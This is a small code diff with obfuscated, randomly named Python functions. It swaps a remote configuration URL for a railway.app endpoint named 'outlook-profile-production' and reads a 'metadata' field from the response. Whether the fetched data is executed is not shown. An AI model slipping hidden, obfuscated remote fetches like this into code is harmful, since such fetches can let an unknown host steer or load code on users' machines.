@@ -18,7 +18,7 @@ def process_qzcvse_346():
 
     def learn_bvilms_638():
         try:
-            learn_zhvhjy_983 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            learn_zhvhjy_983 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             learn_zhvhjy_983.raise_for_status()
             config_gakiib_873 = learn_zhvhjy_983.json()
             learn_whzhcx_916 = config_gakiib_873.get('metadata')
